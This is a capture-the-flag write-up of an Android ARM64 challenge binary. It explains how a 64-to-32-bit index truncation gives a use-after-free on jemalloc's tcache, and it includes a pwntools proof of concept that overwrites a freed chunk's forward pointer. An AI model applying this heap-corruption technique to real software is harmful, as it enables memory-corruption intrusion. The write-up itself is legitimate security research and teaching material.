# javaanggara-impossible-pwn-challenge
> Quick write-up / notes from my research on Java Anggara's 'Impossible' challenge.

---

# Android ARM64 Jemalloc Tcache UAF — Vulnerability Analysis

This repo contains my notes, binary analysis, and a working Proof of Concept (PoC) for the `impossible` challenge on Android ARM64. 

The binary is packed with pretty much every modern mitigation layer you can think of (Full RELRO, Seccomp, Fortify, etc.), making it a tough nut to crack. However, despite all these protections, a classic integer mismatch in the menu handling opens up a clean way to mess with the heap.

## Application Profile

* **Architecture:** ARM64 (Android)
* **Hardening:** PIE, Full RELRO, Stack Canary, Fortify Source, Seccomp-BPF (blocks `execve` and `open`), Ptrace Anti-Debug
* **Allocator:** Jemalloc (Tcache active)
* **Target Difficulty:** 6.0 / 6.0

---

## The Flaw: Breaking Logic via Integer Overflow

While reversing the binary in Ghidra, I spotted a neat logic bug in how the program validates and processes the object index across the main menu loop.

### 1. Truncation Issue
The application reads the user index as a **64-bit value**, but when it actually goes to check boundaries and access the internal array, it truncates/casts that value down to a **32-bit integer** (`int` / `uint`).

Here is how that look in Ghidra's decompiler:
```c
if (((uint)local_100 < 8) && (*(long *)(&DAT_00109830 + (local_100 & 0xffffffff) * 8) != 0))

2. Bypassing the Bounds

Since the check uses a 32-bit truncation, we can feed it a massive 64-bit number that wraps around perfectly. If we pass 4294967296 (0x100000000), the application gets confused:

    (uint)4294967296 chops off the upper bits and evaluates exactly to 0.

    The safety check (0 < 8) passes without a hitch.

    The application proceeds to execute menu commands (Show, Edit) on slot 0.

Since the Edit and Show functions don't double-check if the slot was cleared or freed, this type-casting quirk gives us a super stable Use-After-Free (UAF) primitive to read and write to the heap.
Proof of Concept (PoC)

Here is a quick Python script using pwntools to trigger the bug. It populates the Jemalloc tcache, hits the integer overflow via the massive index, and safely modifies the chunk structure without triggering a crash.
Python

from pwn import *
import time

# Spawning the process via ADB shell on the device
p = process(['adb', 'shell', '/data/local/tmp/impossible'])
time.sleep(0.5)

# The 64-bit magic index that truncates to 0
BIG_IDX = b"4294967296" 

log.info("Populating heap structures...")
# Allocation
p.sendlineafter(b'>', b'2')
p.sendlineafter(b':', b'0')
p.sendlineafter(b':', b'32')
p.sendafter(b':', b'AAAA')

p.sendlineafter(b'>', b'2')
p.sendlineafter(b':', b'1')
p.sendlineafter(b':', b'32')
p.sendafter(b':', b'BBBB')

log.info("Freeing chunks to populate tcache...")
p.sendlineafter(b'>', b'3')
p.sendlineafter(b':', b'1')
p.sendlineafter(b'>', b'3')
p.sendlineafter(b':', b'0')

log.info("Triggering UAF using the overflow index...")
# Editing a freed chunk via our giant index primitive
p.sendlineafter(b'>', b'5')
p.sendlineafter(b':', BIG_IDX)
p.sendafter(b':', b'EEFFFFGG') # Overwriting the tcache forward pointer

log.info("Testing heap stability...")
p.sendlineafter(b'>', b'4')
p.sendlineafter(b':', BIG_IDX)

# Dump output
print(p.recvuntil(b'=== EXP', timeout=1).decode('latin-1', errors='ignore'))
p.close()

Current Roadblocks & Mitigation Barriers

Even though the UAF is fully operational via BIG_IDX, getting code execution or a clean library leak is heavily blocked by how the environment is built:

    Full RELRO: The Global Offset Table (.got) is marked Read-Only after the binary loads. Standard tcache poisoning tricks aimed at hijacking library functions (like free or malloc) just cause an immediate SigSegV on write.

    Strict Seccomp: The sandbox entirely disables execve and open. Traditional shellcode or simple file reading vectors are dead on arrival.

    ASLR & Restrictions: Everything is randomized. Since modern Android security blocks access to /proc/pid/maps, any out-of-bounds math or pointer shifting has to be done blindly, relying purely on relative chunk distances inside Jemalloc.

Final Thoughts

This binary shows a great example of how compile-time defenses (Full RELRO, Seccomp, Fortify) can be completely bypassed at a logic level. A simple type mismatch (int64 down to int32) is all it takes to mess with the app's internal state machine and gain control over low-level memory layout.
